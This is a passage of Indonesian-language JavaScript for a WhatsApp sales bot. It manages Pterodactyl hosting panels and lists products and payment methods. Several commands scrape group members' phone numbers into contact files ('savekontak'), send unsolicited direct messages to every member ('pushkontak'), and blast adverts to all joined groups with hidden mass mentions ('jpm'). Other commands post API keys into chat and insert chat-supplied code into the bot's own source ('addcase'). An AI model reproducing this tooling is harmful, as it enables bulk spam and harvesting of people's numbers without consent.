╔═━━━━━━━[ *LIST SERVER PANEL* ]━━━━━━═╗

┏━━━━━━━━━━━━━━━━━━━━━━━┓
┃     *Informasi Server Panel*
┗━━━━━━━━━━━━━━━━━━━━━━━┛`;

  for (let server of servers) {
    let s = server.attributes;
    let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split("-")[0] + "/resources", {
      method: "GET",
      headers: {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + capikey
      }
    })
    let data = await f3.json();
    let status = data.attributes ? data.attributes.current_state : s.status;

    teks += `
🆔 *ID:* ${s.id}
📛 *Nama:* ${s.name}
🖥️ *RAM:* ${s.limits.memory == 0 ? "Unlimited" : (s.limits.memory / 1000) + "GB"}
💽 *Disk:* ${s.limits.disk == 0 ? "Unlimited" : (s.limits.disk / 1000) + "GB"}
⚙️ *CPU:* ${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu + "%"}
📅 *Dibuat:* ${s.created_at.split("T")[0]}
───────────────────────`;
  }

  teks += `

╚═━━━━━━━[ *AlwaysZakzz* ]━━━━━━═╝`;

  await ZakzzDev.sendMessage(m.chat, {
    buttons: [
      { buttonId: `.delpanel`, buttonText: { displayText: 'Hapus Server Panel' }, type: 1 }
    ],
    footer: `© 2025 ${botname}`,
    headerType: 1,
    viewOnce: true,
    text: teks,
    contextInfo: {
      isForwarded: true,
      mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"],
    },
  }, { quoted: m })
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "deladmin": {
  if (!isCreator) return Reply(mess.owner)

  // Kalau tidak ada ID diketik manual
  if (!text) {
    let cek = await fetch(domain + "/api/application/users?page=1", {
      method: "GET",
      headers: {
        "Accept": "application/json",
        "Content-Type": "application/json",
        "Authorization": "Bearer " + apikey
      }
    })
    let res2 = await cek.json();
    let users = res2.data;
    if (users.length < 1) return m.reply("Tidak ada admin panel")

    let list = []
    for (let i of users) {
      if (i.attributes.root_admin !== true) continue;
      list.push({
        title: `${i.attributes.first_name} (ID ${i.attributes.id})`,
        id: `.deladmin ${i.attributes.id}`
      })
    }

    return ZakzzDev.sendMessage(m.chat, {
      buttons: [
        {
          buttonId: 'action',
          buttonText: { displayText: 'Pilih Admin Panel' },
          type: 4,
          nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
              title: 'Pilih Admin Panel',
              sections: [
                {
                  title: 'List Admin Panel',
                  rows: [...list]
                }
              ]
            })
          }
        }
      ],
      footer: `© 2025 ${botname}`,
      headerType: 1,
      viewOnce: true,
      text: "\nSilakan pilih akun admin panel yang ingin dihapus\n",
      contextInfo: {
        isForwarded: true,
        mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"]
      },
    }, { quoted: m })
  }

  // Jika user ketik ID manual
  let idToDelete = args[0]
  let cek = await fetch(domain + "/api/application/users?page=1", {
    method: "GET",
    headers: {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  })
  let res2 = await cek.json();
  let users = res2.data;

  let found = null;
  for (let e of users) {
    if (e.attributes.id == idToDelete && e.attributes.root_admin === true) {
      found = e;
      break;
    }
  }

  if (!found) return m.reply("Akun admin panel tidak ditemukan atau bukan root_admin!")

  let delusr = await fetch(domain + `/api/application/users/${found.attributes.id}`, {
    method: "DELETE",
    headers: {
      "Accept": "application/json",
      "Content-Type": "application/json",
      "Authorization": "Bearer " + apikey
    }
  })

  if (delusr.ok) {
    return m.reply(`✅ Berhasil menghapus akun admin panel *${found.attributes.first_name}* (ID ${found.attributes.id})`)
  } else {
    let err = await delusr.json()
    return m.reply(`Gagal menghapus admin panel. Error: ${JSON.stringify(err.errors || err)}`)
  }
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "delpanel": {
  if (!isCreator && !isPremium) return Reply(mess.owner);

  if (!text) {
    let list = [];
    let f = await fetch(domain + "/api/application/servers?page=1", {
      method: "GET",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: "Bearer " + apikey
      }
    });
    let res = await f.json();
    let servers = res.data;
    if (!servers || servers.length < 1) return m.reply("Tidak Ada Server Bot");

    for (let server of servers) {
      let s = server.attributes;
      list.push({
        title: `${s.name} (ID ${s.id})`,
        description: `RAM: ${s.limits.memory == 0 ? "Unlimited" : (s.limits.memory / 1000) + "GB"} | DISK: ${s.limits.disk == 0 ? "Unlimited" : (s.limits.disk / 1000) + "GB"} | CPU: ${s.limits.cpu == 0 ? "Unlimited" : s.limits.cpu + "%"}`,
        id: `.delpanel ${s.id}`
      });
    }

    return ZakzzDev.sendMessage(m.chat, {
      buttons: [
        {
          buttonId: 'action',
          buttonText: { displayText: 'Pilih Server Panel' },
          type: 4,
          nativeFlowInfo: {
            name: 'single_select',
            paramsJson: JSON.stringify({
              title: 'Hapus Server Panel',
              sections: [
                {
                  title: 'List Server',
                  rows: list
                }
              ]
            })
          }
        }
      ],
      footer: `© 2025 ${botname}`,
      headerType: 1,
      viewOnce: true,
      text: "\nSilakan pilih server panel yang ingin dihapus\n",
      contextInfo: {
        isForwarded: true,
        mentionedJid: [m.sender, global.owner + "@s.whatsapp.net"]
      },
    }, { quoted: m });
  }

  // Jika ID server diketik manual
  let serverId = Number(text);
  if (!serverId) return m.reply("Masukkan ID server yang valid.");

  let result = await fetch(domain + "/api/application/servers?page=1", {
    method: "GET",
    headers: {
      Accept: "application/json",
      "Content-Type": "application/json",
      Authorization: "Bearer " + apikey
    }
  });
  let json = await result.json();
  let servers = json.data;

  let foundServer = null;
  for (let srv of servers) {
    if (srv.attributes.id == serverId) {
      foundServer = srv.attributes;
      break;
    }
  }

  if (!foundServer) return m.reply("Server panel tidak ditemukan!");

  // Hapus server panel
  let del = await fetch(domain + `/api/application/servers/${foundServer.id}`, {
    method: "DELETE",
    headers: {
      Accept: "application/json",
      "Content-Type": "application/json",
      Authorization: "Bearer " + apikey
    }
  });

  if (!del.ok) {
    let err = await del.json();
    return m.reply("Gagal menghapus server panel.\n" + JSON.stringify(err.errors || err));
  }

  // Cari dan hapus user pemilik server
  let usersRes = await fetch(domain + "/api/application/users?page=1", {
    method: "GET",
    headers: {
      Accept: "application/json",
      "Content-Type": "application/json",
      Authorization: "Bearer " + apikey
    }
  });
  let usersJson = await usersRes.json();
  let users = usersJson.data;

  let ownerToDelete = users.find(u => u.attributes.first_name.toLowerCase() === foundServer.name.toLowerCase());
  if (ownerToDelete) {
    await fetch(domain + `/api/application/users/${ownerToDelete.attributes.id}`, {
      method: "DELETE",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
        Authorization: "Bearer " + apikey
      }
    });
  }

  m.reply(`✅ Berhasil menghapus server panel *${capital(foundServer.name)}*`);
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "linkserver": {
  if (!isCreator) return Reply('*[ System Notice ]* Khusus Owner atau Pengguna Premium.');

  const videoUrl = 'https://files.catbox.moe/5o4kvs.mp4';

  const fkontak = {
    key: {
      fromMe: false,
      participant: '0@s.whatsapp.net',
      ...(m.chat ? { remoteJid: m.chat } : {})
    },
    message: {
      contactMessage: {
        displayName: 'AlwaysZakzz Dev',
        vcard: 'BEGIN:VCARD\nVERSION:3.0\nFN:AlwaysZakzz Bot\nTEL;type=CELL:+62xxxxxx\nEND:VCARD'
      }
    }
  };

  let teks = `
┌─「 🔰 *AlwaysZakzz API Panel* 🔰 」─
│ 🌐 *Domain*     : ${global.domain || 'Not Set'}
│ 🔑 *API Key*    : ${global.apikey || 'Not Set'}
│ 🛡️ *CAPTCHA Key*: ${global.capikey || 'Not Set'}
│───────────────────────────
│ 🌐 *Domain V2*  : ${global.domainV2 || 'Not Set'}
│ 🔑 *API Key V2* : ${global.apikeyV2 || 'Not Set'}
│ 🛡️ *CAPTCHA V2* : ${global.capikeyV2 || 'Not Set'}
└───────────────────────────
`;

  await ZakzzDev.sendMessage(m.chat, {
    video: { url: videoUrl },
    caption: teks,
    gifPlayback: true,
    gifAttribution: 1,
    contextInfo: {
      mentionedJid: [m.sender],
      externalAdReply: {
        title: '𝗔𝗹𝘄𝗮𝘆𝘀𝗭𝗮𝗸𝘇𝘇 - V8',
        body: 'Panel Access',
        mediaType: 1,
        thumbnailUrl: null,
        showAdAttribution: true,
        sourceUrl: 'https://files.catbox.moe/k4owwk.jpg'
      }
    }
  }, { quoted: fkontak });
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "produk": case "listproduk": case "list": {
await ZakzzDev.sendMessage(m.chat, {
  footer: `© 2025 ${botname}`,
  buttons: [{
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: '.buypanel'
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: '.buyadp'
                },                
                {
                  title: 'Vps (Virtual Private Server)',
                  id: '.buyvps'
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: '.buysc'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  text: "Berikut adalah list produk\n"
})
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "savekontak": {
if (!isOwner) return Reply(mess.owner)
if (!text) return m.reply(example("idgrupnya"))
let res = await ZakzzDev.groupMetadata(text)
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./library/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer Skyzopedia - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./library/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await ZakzzDev.sendMessage(m.sender, { document: fs.readFileSync("./library/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./library/database/contacts.vcf", "")
}}
break
//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "savekontak2": {
if (!isOwner) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
let res = await m.metadata
const halls = await res.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
contacts.push(mem)
fs.writeFileSync('./library/database/contacts.json', JSON.stringify(contacts))
}}
try {
const uniqueContacts = [...new Set(contacts)]
const vcardContent = uniqueContacts.map((contact, index) => {
const vcard = [
"BEGIN:VCARD",
"VERSION:3.0",
`FN:Buyer Skyzopedia - ${contact.split("@")[0]}`,
`TEL;type=CELL;type=VOICE;waid=${contact.split("@")[0]}:+${contact.split("@")[0]}`,
"END:VCARD",
"", ].join("\n")
return vcard }).join("")
fs.writeFileSync("./library/database/contacts.vcf", vcardContent, "utf8")
} catch (err) {
m.reply(err.toString())
} finally {
if (m.chat !== m.sender) await m.reply(`*Berhasil membuat file kontak ✅*
File kontak telah dikirim ke private chat
Total *${halls.length}* kontak`)
await ZakzzDev.sendMessage(m.sender, { document: fs.readFileSync("./library/database/contacts.vcf"), fileName: "contacts.vcf", caption: `File kontak berhasil dibuat ✅\nTotal *${halls.length}* kontak`, mimetype: "text/vcard", }, { quoted: m })
contacts.splice(0, contacts.length)
await fs.writeFileSync("./library/database/contacts.json", JSON.stringify(contacts))
await fs.writeFileSync("./library/database/contacts.vcf", "")
}}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "pushkontak": {
if (!isOwner) return Reply(mess.owner)
if (!text) return m.reply(example("pesannya"))
const meta = await ZakzzDev.groupFetchAllParticipating()
let dom = await Object.keys(meta)
global.textpushkontak = text
let list = []
for (let i of dom) {
await list.push({
title: meta[i].subject, 
id: `.respushkontak ${i}`, 
description: `${meta[i].participants.length} Member`
})
}
return ZakzzDev.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Grup',
          sections: [
            {
              title: 'List Grup Chat',
              rows: [...list]              
            }
          ]
        })
      }
      }
  ],
  footer: `© 2025 ${botname}`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Target Grup Pushkontak\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "respushkontak": {
if (!isOwner) return 
if (!text) return 
if (!global.textpushkontak) return
const idgc = text
const teks = global.textpushkontak
const jidawal = m.chat
const data = await ZakzzDev.groupMetadata(idgc)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await m.reply(`Memproses *pushkontak* ke dalam grup *${data.subject}*`)

for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
await ZakzzDev.sendMessage(mem, {text: teks}, {quoted: qlocPush })
await sleep(global.delayPushkontak)
}}

delete global.textpushkontak
await ZakzzDev.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "pushkontak2": {
if (!isOwner) return Reply(mess.owner)
if (!m.isGroup) return Reply(mess.group)
if (!text) return m.reply(example("pesannya"))
const teks = text
const jidawal = m.chat
const data = await ZakzzDev.groupMetadata(m.chat)
const halls = await data.participants.filter(v => v.id.endsWith('.net')).map(v => v.id)
await m.reply(`Memproses pushkontak ke *${halls.length}* member grup`)
for (let mem of halls) {
if (mem !== botNumber && mem.split("@")[0] !== global.owner) {
await ZakzzDev.sendMessage(mem, {text: teks}, {quoted: qlocPush })
await sleep(global.delayPushkontak)
}}

await ZakzzDev.sendMessage(jidawal, {text: `*Berhasil Pushkontak ✅*\nTotal member berhasil dikirim pesan : ${halls.length}`}, {quoted: m})
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "jpmslide": {
if (!isCreator) return Reply(mess.owner)
let allgrup = await ZakzzDev.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await m.reply(`Memproses *jpmslide* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i)
count += 1
} catch {}
await sleep(global.delayJpm)
}
await ZakzzDev.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "jpmslidehidetag": case "jpmslideht": {
if (!isCreator) return Reply(mess.owner)
let allgrup = await ZakzzDev.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
await m.reply(`Memproses *jpmslide hidetag* Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await slideButton(i, allgrup[i].participants.map(e => e.id))
count += 1
} catch {}
await sleep(global.delayJpm)
}
await ZakzzDev.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "jpm": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teksnya"))
let allgrup = await ZakzzDev.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
const teks = text
await m.reply(`Memproses *jpm* teks Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await ZakzzDev.sendMessage(i, {text: `${teks}`}, {quoted: qlocJpm})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await ZakzzDev.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "jpmfoto": case "jpmvideo": {
    if (!isCreator) return Reply(mess.owner)
    if (!q) return m.reply(example("teks dengan mengirim foto/video"))
    if (!/image|video/.test(mime)) return m.reply(example("Harap kirim foto atau video beserta teks"))

    let allgrup = await ZakzzDev.groupFetchAllParticipating()
    let res = Object.keys(allgrup)
    let count = 0
    const jid = m.chat
    const teks = text
    const rest = await ZakzzDev.downloadAndSaveMediaMessage(qmsg)

    await m.reply(`Memproses *Jpm* ${/image/.test(mime) ? 'foto' : 'video'} ke ${res.length} grup`)

    for (let i of res) {
        if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
        try {
            if (/image/.test(mime)) {
                await ZakzzDev.sendMessage(i, { image: fs.readFileSync(rest), caption: teks }, { quoted: qlocJpm || null })
            } else {
                await ZakzzDev.sendMessage(i, { video: fs.readFileSync(rest), caption: teks }, { quoted: qlocJpm || null })
            }
            count += 1
        } catch (e) { }
        await sleep(global.delayJpm)
    }

    await fs.unlinkSync(rest)
    await ZakzzDev.sendMessage(jid, { text: `*Jpm Telah Selesai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}` }, { quoted: m })
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "jpmht": {
    if (!isCreator) return Reply(mess.owner)
    if (!q) return m.reply(example("teksnya"))
    
    let allgrup = await ZakzzDev.groupFetchAllParticipating()
    let res = await Object.keys(allgrup)
    let count = 0
    const jid = m.chat
    const teks = text
    
    await m.reply(`Memproses *jpm hidetag* ke ${res.length} grup`)

    for (let i of res) {
        if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
        try {
            let metadata = await ZakzzDev.groupMetadata(i)
            let participants = metadata.participants.map(u => u.id)

            await ZakzzDev.sendMessage(i, { 
                text: teks, 
                mentions: participants 
            }) // Hidetag, tidak menampilkan username

            count += 1
        } catch {}
        await sleep(global.delayJpm)
    }

    await ZakzzDev.sendMessage(jid, { 
        text: `*Jpm Hidetag Telah Selesai ✅*\nTotal grup yang berhasil dikirim pesan: ${count}` 
    }, { quoted: m })
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "jpmtesti": {
if (!isCreator) return Reply(mess.owner)
if (!q) return m.reply(example("teks dengan mengirim foto"))
if (!/image/.test(mime)) return m.reply(example("teks dengan mengirim foto"))
const allgrup = await ZakzzDev.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await ZakzzDev.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses *jpm* testimoni Ke ${res.length} grup`)
for (let i of res) {
if (global.db.groups[i] && global.db.groups[i].blacklistjpm && global.db.groups[i].blacklistjpm == true) continue
try {
await ZakzzDev.sendMessage(i, {
  footer: `© 2025 ${botname}`,
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Beli Produk',
          sections: [
            {
              title: 'List Produk',
              highlight_label: 'Recommended',
              rows: [
                {
                  title: 'Panel Pterodactyl',
                  id: '.buypanel'
                },
                {
                  title: 'Admin Panel Pterodactyl',
                  id: '.buyadp'
                },                
                {
                  title: 'Vps (Virtual Private Server)',
                  id: '.buyvps'
                },
                {
                  title: 'Nokos (Nomor Kosong)',
                  id: '.buynokos'
                },
                {
                  title: 'Script Bot WhatsApp',
                  id: '.buysc'
                }
              ]
            }
          ]
        })
      }
      }
  ],
  headerType: 1,
  viewOnce: true,
  image: await fs.readFileSync(rest), 
  caption: `\n${teks}\n`,
  contextInfo: {
   isForwarded: true, 
   forwardedNewsletterMessageInfo: {
   newsletterJid: global.idSaluran,
   newsletterName: global.namaSaluran
   }
  },
}, {quoted: qtoko})
count += 1
} catch {}
await sleep(global.delayJpm)
}
await fs.unlinkSync(rest)
await ZakzzDev.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "pay":
case "payment":
case "qris": {
    const caption = `🧾 *Metode Pembayaran*
Silakan *scan QRIS* di atas untuk melakukan pembayaran.

Jika sudah transfer, mohon kirim bukti pembayaran.

Pilih metode lain jika diperlukan:`.trim()

    await ZakzzDev.sendMessage(m.chat, {
        caption,
        image: { url: global.qris },
        footer: `© 2025 ${botname}`,
        viewOnce: true,
        buttons: [
            {
                buttonId: 'action',
                buttonText: { displayText: 'Pilih Metode Lain' },
                type: 4,
                nativeFlowInfo: {
                    name: 'single_select',
                    paramsJson: JSON.stringify({
                        title: 'Metode Pembayaran Lain',
                        sections: [
                            {
                                title: 'List Payment',
                                rows: [
                                    { title: 'DANA', id: '.dana' },
                                    { title: 'OVO', id: '.ovo' },
                                    { title: 'GOPAY', id: '.gopay' },
                                    { title: 'SHOPEEPAY', id: '.shopepay' }
                                ]
                            }
                        ]
                    })
                }
            }
        ],
        headerType: 1
    }, { quoted: qtext2 })
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "dana": {
    if (!isCreator) return

    let teks = `
╭───〔 *PAYMENT - DANA* 〕───
│ 👤 *A/n*    : DAR**
│ 💳 *Nomor*   : ${global.dana}
│ 🏦 *Bank*    : Dana Ewallet
╰────────────────────────

📌 *Catatan Penting:*
Harap *kirim bukti transfer* setelah pembayaran untuk menghindari penipuan dan mempercepat proses verifikasi.`.trim()

    await ZakzzDev.sendMessage(m.chat, { text: teks }, { quoted: qtext2 })
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "ovo": {
    if (!isCreator) return

    let teks = `
╭───〔 *PAYMENT - OVO* 〕───
│ 👤 *A/n*    : Isi nama ewallet ovo mu!
│ 💳 *Nomor*   : ${global.ovo}
│ 🏦 *Bank*    : Ovo Ewallet
╰────────────────────────

📌 *Catatan Penting:*
Harap *kirim bukti transfer* setelah pembayaran untuk menghindari penipuan dan mempercepat proses verifikasi.`.trim()

    await ZakzzDev.sendMessage(m.chat, { text: teks }, { quoted: qtext2 })
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "gopay": {
    if (!isCreator) return

    let teks = `
╭───〔 *PAYMENT - GOPAY* 〕───
│ 👤 *A/n*    : ZakzzHosting
│ 💳 *Nomor*   : ${global.gopay}
│ 🏦 *Bank*    : GoPay Ewallet
╰────────────────────────

📌 *Catatan Penting:*
Harap *kirim bukti transfer* setelah pembayaran untuk menghindari penipuan dan mempercepat proses verifikasi.`.trim()

    await ZakzzDev.sendMessage(m.chat, { text: teks }, { quoted: qtext2 })
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "shopepay": {
    if (!isCreator) return

    let teks = `
╭───〔 *PAYMENT - SHOPEEPAY* 〕───
│ 👤 *A/n*    : Isi nama ewallet ovo mu!
│ 💳 *Nomor*   : ${global.shopepay}
│ 🏦 *Bank*    : ShopePay Ewallet
╰────────────────────────

📌 *Catatan Penting:*
Harap *kirim bukti transfer* setelah pembayaran untuk menghindari penipuan dan mempercepat proses verifikasi.`.trim()

    await ZakzzDev.sendMessage(m.chat, { text: teks }, { quoted: qtext2 })
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "ambilq": case "q": {
if (!m.quoted) return
let jsonData = JSON.stringify(m.quoted, null, 2)
m.reply(jsonData)
} 
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "toaudio": case "tovn": {
if (!/video|mp4/.test(mime)) return m.reply(example("dengan reply/kirim vidio"))
const vid = await ZakzzDev.downloadAndSaveMediaMessage(qmsg)
const result = await toAudio(fs.readFileSync(vid), "mp4")
await ZakzzDev.sendMessage(m.chat, { audio: result, mimetype: "audio/mpeg", ptt: /tovn/.test(command) ? true : false }, { quoted: m })
await fs.unlinkSync(vid)
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "proses": {
    if (!isCreator) return Reply(mess.owner)
    if (!q) return m.reply(example("proses jasa install panel|nominal|Payment"))

    let [barang, nominal, pembayaran] = q.split("|")
    if (!barang || !nominal || !pembayaran) return m.reply("Format salah!\nContoh:  Proses Jasa instal panel|10k|Dana")

    let teks = `📦 *BARANG* : ${barang}
💳 *Nominal* : ${nominal}
💼 *Payment* : ${pembayaran}
⏰ *Waktu* : ${tanggal(Date.now())}
⚡ *Status* : Sedang diproses...

*Testimoni :*
${linkSaluran}`

    await ZakzzDev.sendMessage(m.chat, {
        text: teks,
        mentions: [m.sender],
        contextInfo: {
            externalAdReply: {
                title: `Dana Masuk ✅`,
                body: `© Powered By ${namaOwner}`,
                thumbnailUrl: 'https://files.catbox.moe/k4owwk.jpg',
                sourceUrl: linkSaluran,
            }
        }
    }, { quoted: null })
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "done": {
    if (!isCreator) return Reply(mess.owner)
    if (!q) return m.reply(example("barang|nominal|payment"))

    let [barang, nominal, pembayaran] = q.split("|")
    if (!barang || !nominal || !pembayaran) return m.reply("Format salah!\nContoh: Sempak|25k|Dana")

    let teks = `📦 *BARANG* : ${barang}
💳 *NOMINAL* : ${nominal}
💼 *Payment* : ${pembayaran}
⏰ *WAKTU* : ${tanggal(Date.now())}
📊 *STATUS* : Berhasil✅

*Testimoni :*
${linkSaluran}

*Marketplace :*
${linkGrup}`

    await ZakzzDev.sendMessage(m.chat, {
        text: teks,
        mentions: [m.sender],
        contextInfo: {
            externalAdReply: {
                title: `Transaksi Selesai ✅`,
                body: `© Powered By ${namaOwner}`,
                thumbnailUrl: 'https://files.catbox.moe/k4owwk.jpg',
                sourceUrl: linkSaluran,
            }
        }
    }, { quoted: null })
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "owner": case "developer": {
  const ownerNumber = '6281315224632';
  const ownerName = '@Aliftzycrt';

  const vCard = `BEGIN:VCARD
VERSION:3.0
FN:${ownerName}
TEL;waid=${ownerNumber}:${ownerNumber}
END:VCARD`;

  await ZakzzDev.sendMessage(m.chat, {
    contacts: {
      displayName: ownerName,
      contacts: [{ vcard: vCard }],
    },
  });

  await ZakzzDev.sendMessage(m.chat, {
  text: 'My Owner nih, Udh Tampan pemberani wangy rajin menabung dan tidak sombong, chat aj kalo mau di sv owner gw, kapan lagi😎',
  quote: m
});
};
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "save": case "sv": {
if (!isCreator) return
await ZakzzDev.sendContact(m.chat, [m.chat.split("@")[0]], m)
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "self": {
if (!isCreator) return
ZakzzDev.public = false
m.reply("Berhasil mengganti ke mode *self*")
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "getcase": {
if (!isCreator) return Reply(mess.owner)
if (!text) return m.reply(example("menu"))
const getcase = (cases) => {
return "case"+`\"${cases}\"`+fs.readFileSync('./AlwaysZakzzDev.js').toString().split('case \"'+cases+'\"')[1].split("break")[0]+"break"
}
try {
m.reply(`${getcase(q)}`)
} catch (e) {
return m.reply(`Case *${text}* tidak ditemukan`)
}
}
break

//✦━─━──━─━─【 AlwaysZakzz 】─━─━──━─━✦//

case "addcase": {
    if (!isCreator) return m.reply(mess.owner)
    if (!text) return m.reply(`✏️ Contoh: ${prefix + command} case "halo": { reply("halo juga") } break`)
    
    const fs = require("fs")
    const path = require("path")
    const filePath = path.join(__dirname, "AlwaysZakzzDev.js")

    const caseBaru = `${text.trim()}\n\n`

    fs.readFile(filePath, "utf8", (err, data) => {
        if (err) {
            console.error("❌ Gagal membaca file:", err)
            return m.reply("🚫 Gagal membaca file utama.")
        }

        const posisiDefault = data.lastIndexOf("default:")
        if (posisiDefault === -1) return m.reply("🚫 Tidak ditemukan 'default:' di dalam file!")

        // Sisipkan sebelum default:
        const dataBaru = data.slice(0, posisiDefault) + caseBaru + data.slice(posisiDefault)

        fs.writeFile(filePath, dataBaru, "utf8", (err) => {
            if (err) {
                console.error("❌ Gagal menulis file:", err)
                return m.reply("🚫 Terjadi kesalahan saat menyimpan case.")
            }

            console.log("✅ Case baru ditambahkan:\n", caseBaru)
            return m.reply("✅ Case baru berhasil ditambahkan ke AlwaysZakzzDev.js!")
        })
    })
}
break

